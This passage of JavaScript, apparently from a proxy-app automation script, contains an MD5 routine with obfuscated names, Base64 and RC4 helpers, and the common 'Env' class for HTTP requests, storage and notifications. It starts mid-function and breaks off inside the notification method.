  function _0x306315(_0x26ec95, _0x37039c, _0x3121d3, _0xfe9b8b, _0x11bd6b, _0x257777, _0x27497c) {
    _0x26ec95 = _0x3d8e41(_0x26ec95, _0x3d8e41(_0x3d8e41(_0x474e8c(_0x37039c, _0x3121d3, _0xfe9b8b), _0x11bd6b), _0x27497c));
    return _0x3d8e41(_0x385d68(_0x26ec95, _0x257777), _0x37039c);
  }
  function _0x4296df(_0x2f81a8) {
    for (var _0x3bd394, _0x530eb9 = _0x2f81a8.length, _0x43b8ff = _0x530eb9 + 8, _0x9f6b91 = (_0x43b8ff - _0x43b8ff % 64) / 64, _0x2fc1c4 = 16 * (_0x9f6b91 + 1), _0x4c498f = new Array(_0x2fc1c4 - 1), _0x485da0 = 0, _0x370f68 = 0; _0x530eb9 > _0x370f68;) {
      _0x3bd394 = (_0x370f68 - _0x370f68 % 4) / 4;
      _0x485da0 = _0x370f68 % 4 * 8;
      _0x4c498f[_0x3bd394] = _0x4c498f[_0x3bd394] | _0x2f81a8.charCodeAt(_0x370f68) << _0x485da0;
      _0x370f68++;
    }
    _0x3bd394 = (_0x370f68 - _0x370f68 % 4) / 4;
    _0x485da0 = _0x370f68 % 4 * 8;
    _0x4c498f[_0x3bd394] = _0x4c498f[_0x3bd394] | 128 << _0x485da0;
    _0x4c498f[_0x2fc1c4 - 2] = _0x530eb9 << 3;
    _0x4c498f[_0x2fc1c4 - 1] = _0x530eb9 >>> 29;
    return _0x4c498f;
  }
  function _0x392360(_0x3e930b) {
    var _0x507e9a,
      _0x941968,
      _0x141257 = "",
      _0x1c2e9d = "";
    for (_0x941968 = 0; 3 >= _0x941968; _0x941968++) {
      _0x507e9a = _0x3e930b >>> 8 * _0x941968 & 255;
      _0x1c2e9d = "0" + _0x507e9a.toString(16);
      _0x141257 += _0x1c2e9d.substr(_0x1c2e9d.length - 2, 2);
    }
    return _0x141257;
  }
  function _0x20e2d6(_0x548cb3) {
    _0x548cb3 = _0x548cb3.replace(/\r\n/g, "\n");
    for (var _0x419c00 = "", _0x263269 = 0; _0x263269 < _0x548cb3.length; _0x263269++) {
      var _0x36ad13 = _0x548cb3.charCodeAt(_0x263269);
      128 > _0x36ad13 ? _0x419c00 += String.fromCharCode(_0x36ad13) : _0x36ad13 > 127 && 2048 > _0x36ad13 ? (_0x419c00 += String.fromCharCode(_0x36ad13 >> 6 | 192), _0x419c00 += String.fromCharCode(63 & _0x36ad13 | 128)) : (_0x419c00 += String.fromCharCode(_0x36ad13 >> 12 | 224), _0x419c00 += String.fromCharCode(_0x36ad13 >> 6 & 63 | 128), _0x419c00 += String.fromCharCode(63 & _0x36ad13 | 128));
    }
    return _0x419c00;
  }
  var _0x5d5d1f,
    _0x13bdc3,
    _0x52e057,
    _0x36d1af,
    _0xe68907,
    _0x328587,
    _0xdb8909,
    _0x5a7016,
    _0x448af2,
    _0x47caa1 = [],
    _0x524c7c = 7,
    _0x3600c1 = 12,
    _0x54dac4 = 17,
    _0x4d1774 = 22,
    _0x582d8a = 5,
    _0x386260 = 9,
    _0x4f5a38 = 14,
    _0xce2709 = 20,
    _0x5144e7 = 4,
    _0x514840 = 11,
    _0x3b9181 = 16,
    _0x560401 = 23,
    _0x5b3868 = 6,
    _0x38dd19 = 10,
    _0x22fe18 = 15,
    _0x5765e7 = 21;
  for (_0x483f9c = _0x20e2d6(_0x483f9c), _0x47caa1 = _0x4296df(_0x483f9c), _0x328587 = 1732584193, _0xdb8909 = 4023233417, _0x5a7016 = 2562383102, _0x448af2 = 271733878, _0x5d5d1f = 0; _0x5d5d1f < _0x47caa1.length; _0x5d5d1f += 16) {
    _0x13bdc3 = _0x328587;
    _0x52e057 = _0xdb8909;
    _0x36d1af = _0x5a7016;
    _0xe68907 = _0x448af2;
    _0x328587 = _0x245980(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 0], _0x524c7c, 3614090360);
    _0x448af2 = _0x245980(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 1], _0x3600c1, 3905402710);
    _0x5a7016 = _0x245980(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 2], _0x54dac4, 606105819);
    _0xdb8909 = _0x245980(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 3], _0x4d1774, 3250441966);
    _0x328587 = _0x245980(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 4], _0x524c7c, 4118548399);
    _0x448af2 = _0x245980(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 5], _0x3600c1, 1200080426);
    _0x5a7016 = _0x245980(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 6], _0x54dac4, 2821735955);
    _0xdb8909 = _0x245980(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 7], _0x4d1774, 4249261313);
    _0x328587 = _0x245980(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 8], _0x524c7c, 1770035416);
    _0x448af2 = _0x245980(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 9], _0x3600c1, 2336552879);
    _0x5a7016 = _0x245980(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 10], _0x54dac4, 4294925233);
    _0xdb8909 = _0x245980(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 11], _0x4d1774, 2304563134);
    _0x328587 = _0x245980(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 12], _0x524c7c, 1804603682);
    _0x448af2 = _0x245980(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 13], _0x3600c1, 4254626195);
    _0x5a7016 = _0x245980(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 14], _0x54dac4, 2792965006);
    _0xdb8909 = _0x245980(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 15], _0x4d1774, 1236535329);
    _0x328587 = _0x17ae6f(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 1], _0x582d8a, 4129170786);
    _0x448af2 = _0x17ae6f(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 6], _0x386260, 3225465664);
    _0x5a7016 = _0x17ae6f(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 11], _0x4f5a38, 643717713);
    _0xdb8909 = _0x17ae6f(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 0], _0xce2709, 3921069994);
    _0x328587 = _0x17ae6f(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 5], _0x582d8a, 3593408605);
    _0x448af2 = _0x17ae6f(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 10], _0x386260, 38016083);
    _0x5a7016 = _0x17ae6f(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 15], _0x4f5a38, 3634488961);
    _0xdb8909 = _0x17ae6f(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 4], _0xce2709, 3889429448);
    _0x328587 = _0x17ae6f(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 9], _0x582d8a, 568446438);
    _0x448af2 = _0x17ae6f(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 14], _0x386260, 3275163606);
    _0x5a7016 = _0x17ae6f(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 3], _0x4f5a38, 4107603335);
    _0xdb8909 = _0x17ae6f(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 8], _0xce2709, 1163531501);
    _0x328587 = _0x17ae6f(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 13], _0x582d8a, 2850285829);
    _0x448af2 = _0x17ae6f(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 2], _0x386260, 4243563512);
    _0x5a7016 = _0x17ae6f(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 7], _0x4f5a38, 1735328473);
    _0xdb8909 = _0x17ae6f(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 12], _0xce2709, 2368359562);
    _0x328587 = _0x3dced1(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 5], _0x5144e7, 4294588738);
    _0x448af2 = _0x3dced1(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 8], _0x514840, 2272392833);
    _0x5a7016 = _0x3dced1(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 11], _0x3b9181, 1839030562);
    _0xdb8909 = _0x3dced1(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 14], _0x560401, 4259657740);
    _0x328587 = _0x3dced1(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 1], _0x5144e7, 2763975236);
    _0x448af2 = _0x3dced1(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 4], _0x514840, 1272893353);
    _0x5a7016 = _0x3dced1(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 7], _0x3b9181, 4139469664);
    _0xdb8909 = _0x3dced1(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 10], _0x560401, 3200236656);
    _0x328587 = _0x3dced1(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 13], _0x5144e7, 681279174);
    _0x448af2 = _0x3dced1(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 0], _0x514840, 3936430074);
    _0x5a7016 = _0x3dced1(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 3], _0x3b9181, 3572445317);
    _0xdb8909 = _0x3dced1(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 6], _0x560401, 76029189);
    _0x328587 = _0x3dced1(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 9], _0x5144e7, 3654602809);
    _0x448af2 = _0x3dced1(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 12], _0x514840, 3873151461);
    _0x5a7016 = _0x3dced1(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 15], _0x3b9181, 530742520);
    _0xdb8909 = _0x3dced1(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 2], _0x560401, 3299628645);
    _0x328587 = _0x306315(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 0], _0x5b3868, 4096336452);
    _0x448af2 = _0x306315(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 7], _0x38dd19, 1126891415);
    _0x5a7016 = _0x306315(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 14], _0x22fe18, 2878612391);
    _0xdb8909 = _0x306315(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 5], _0x5765e7, 4237533241);
    _0x328587 = _0x306315(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 12], _0x5b3868, 1700485571);
    _0x448af2 = _0x306315(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 3], _0x38dd19, 2399980690);
    _0x5a7016 = _0x306315(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 10], _0x22fe18, 4293915773);
    _0xdb8909 = _0x306315(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 1], _0x5765e7, 2240044497);
    _0x328587 = _0x306315(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 8], _0x5b3868, 1873313359);
    _0x448af2 = _0x306315(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 15], _0x38dd19, 4264355552);
    _0x5a7016 = _0x306315(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 6], _0x22fe18, 2734768916);
    _0xdb8909 = _0x306315(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 13], _0x5765e7, 1309151649);
    _0x328587 = _0x306315(_0x328587, _0xdb8909, _0x5a7016, _0x448af2, _0x47caa1[_0x5d5d1f + 4], _0x5b3868, 4149444226);
    _0x448af2 = _0x306315(_0x448af2, _0x328587, _0xdb8909, _0x5a7016, _0x47caa1[_0x5d5d1f + 11], _0x38dd19, 3174756917);
    _0x5a7016 = _0x306315(_0x5a7016, _0x448af2, _0x328587, _0xdb8909, _0x47caa1[_0x5d5d1f + 2], _0x22fe18, 718787259);
    _0xdb8909 = _0x306315(_0xdb8909, _0x5a7016, _0x448af2, _0x328587, _0x47caa1[_0x5d5d1f + 9], _0x5765e7, 3951481745);
    _0x328587 = _0x3d8e41(_0x328587, _0x13bdc3);
    _0xdb8909 = _0x3d8e41(_0xdb8909, _0x52e057);
    _0x5a7016 = _0x3d8e41(_0x5a7016, _0x36d1af);
    _0x448af2 = _0x3d8e41(_0x448af2, _0xe68907);
  }
  var _0x53e55e = _0x392360(_0x328587) + _0x392360(_0xdb8909) + _0x392360(_0x5a7016) + _0x392360(_0x448af2);
  return _0x53e55e.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x5c5f9a) {
    var _0x3c049d = "",
      _0x14749d,
      _0x32272c,
      _0x54b1f1,
      _0x55f107,
      _0x2a9163,
      _0x3c797c,
      _0x1846f4,
      _0x558175 = 0;
    _0x5c5f9a = _utf8_encode(_0x5c5f9a);
    while (_0x558175 < _0x5c5f9a.length) {
      _0x14749d = _0x5c5f9a.charCodeAt(_0x558175++);
      _0x32272c = _0x5c5f9a.charCodeAt(_0x558175++);
      _0x54b1f1 = _0x5c5f9a.charCodeAt(_0x558175++);
      _0x55f107 = _0x14749d >> 2;
      _0x2a9163 = (_0x14749d & 3) << 4 | _0x32272c >> 4;
      _0x3c797c = (_0x32272c & 15) << 2 | _0x54b1f1 >> 6;
      _0x1846f4 = _0x54b1f1 & 63;
      if (isNaN(_0x32272c)) {
        _0x3c797c = _0x1846f4 = 64;
      } else {
        isNaN(_0x54b1f1) && (_0x1846f4 = 64);
      }
      _0x3c049d = _0x3c049d + _keyStr.charAt(_0x55f107) + _keyStr.charAt(_0x2a9163) + _keyStr.charAt(_0x3c797c) + _keyStr.charAt(_0x1846f4);
    }
    return _0x3c049d;
  };
  this.decode = function (_0x197fd3) {
    var _0x29cc7b = "",
      _0x259bc5,
      _0xd125f2,
      _0x37c629,
      _0x4bb0df,
      _0x33eefe,
      _0x5d4378,
      _0xed37da,
      _0x296fe1 = 0;
    _0x197fd3 = _0x197fd3.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x296fe1 < _0x197fd3.length) {
      _0x4bb0df = _keyStr.indexOf(_0x197fd3.charAt(_0x296fe1++));
      _0x33eefe = _keyStr.indexOf(_0x197fd3.charAt(_0x296fe1++));
      _0x5d4378 = _keyStr.indexOf(_0x197fd3.charAt(_0x296fe1++));
      _0xed37da = _keyStr.indexOf(_0x197fd3.charAt(_0x296fe1++));
      _0x259bc5 = _0x4bb0df << 2 | _0x33eefe >> 4;
      _0xd125f2 = (_0x33eefe & 15) << 4 | _0x5d4378 >> 2;
      _0x37c629 = (_0x5d4378 & 3) << 6 | _0xed37da;
      _0x29cc7b = _0x29cc7b + String.fromCharCode(_0x259bc5);
      _0x5d4378 != 64 && (_0x29cc7b = _0x29cc7b + String.fromCharCode(_0xd125f2));
      _0xed37da != 64 && (_0x29cc7b = _0x29cc7b + String.fromCharCode(_0x37c629));
    }
    _0x29cc7b = _utf8_decode(_0x29cc7b);
    return _0x29cc7b;
  };
  _utf8_encode = function (_0x15bb40) {
    _0x15bb40 = _0x15bb40.replace(/\r\n/g, "\n");
    var _0x58e4ff = "";
    for (var _0x570b18 = 0; _0x570b18 < _0x15bb40.length; _0x570b18++) {
      var _0x48bde9 = _0x15bb40.charCodeAt(_0x570b18);
      if (_0x48bde9 < 128) {
        _0x58e4ff += String.fromCharCode(_0x48bde9);
      } else {
        _0x48bde9 > 127 && _0x48bde9 < 2048 ? (_0x58e4ff += String.fromCharCode(_0x48bde9 >> 6 | 192), _0x58e4ff += String.fromCharCode(_0x48bde9 & 63 | 128)) : (_0x58e4ff += String.fromCharCode(_0x48bde9 >> 12 | 224), _0x58e4ff += String.fromCharCode(_0x48bde9 >> 6 & 63 | 128), _0x58e4ff += String.fromCharCode(_0x48bde9 & 63 | 128));
      }
    }
    return _0x58e4ff;
  };
  _utf8_decode = function (_0x1cddad) {
    c1 = c2 = 0;
    var _0x317748 = "",
      _0x137046 = 0,
      _0xc3d235 = c1;
    while (_0x137046 < _0x1cddad.length) {
      _0xc3d235 = _0x1cddad.charCodeAt(_0x137046);
      if (_0xc3d235 < 128) {
        _0x317748 += String.fromCharCode(_0xc3d235);
        _0x137046++;
      } else {
        _0xc3d235 > 191 && _0xc3d235 < 224 ? (c2 = _0x1cddad.charCodeAt(_0x137046 + 1), _0x317748 += String.fromCharCode((_0xc3d235 & 31) << 6 | c2 & 63), _0x137046 += 2) : (c2 = _0x1cddad.charCodeAt(_0x137046 + 1), c3 = _0x1cddad.charCodeAt(_0x137046 + 2), _0x317748 += String.fromCharCode((_0xc3d235 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x137046 += 3);
      }
    }
    return _0x317748;
  };
}
function rc4(_0x9dc835, _0x37d298) {
  var _0x4bae26 = Array(256),
    _0x4ebf03 = Array(_0x9dc835.length);
  for (var _0x2e01dc = 0; _0x2e01dc < 256; _0x2e01dc++) {
    _0x4bae26[_0x2e01dc] = _0x2e01dc;
    var _0x158e52 = (_0x158e52 + _0x4bae26[_0x2e01dc] + _0x37d298.charCodeAt(_0x2e01dc % _0x37d298.length)) % 256,
      _0x2f9c62 = _0x4bae26[_0x2e01dc];
    _0x4bae26[_0x2e01dc] = _0x4bae26[_0x158e52];
    _0x4bae26[_0x158e52] = _0x2f9c62;
  }
  for (var _0x2e01dc = 0; _0x2e01dc < _0x9dc835.length; _0x2e01dc++) {
    _0x4ebf03[_0x2e01dc] = _0x9dc835.charCodeAt(_0x2e01dc);
  }
  for (var _0x449a83 = 0; _0x449a83 < _0x4ebf03.length; _0x449a83++) {
    var _0x2e01dc = (_0x2e01dc + 1) % 256,
      _0x158e52 = (_0x158e52 + _0x4bae26[_0x2e01dc]) % 256,
      _0x2f9c62 = _0x4bae26[_0x2e01dc];
    _0x4bae26[_0x2e01dc] = _0x4bae26[_0x158e52];
    _0x4bae26[_0x158e52] = _0x2f9c62;
    var _0x5478f9 = (_0x4bae26[_0x2e01dc] + _0x4bae26[_0x158e52] % 256) % 256;
    _0x4ebf03[_0x449a83] = String.fromCharCode(_0x4ebf03[_0x449a83] ^ _0x4bae26[_0x5478f9]);
  }
  return _0x4ebf03.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
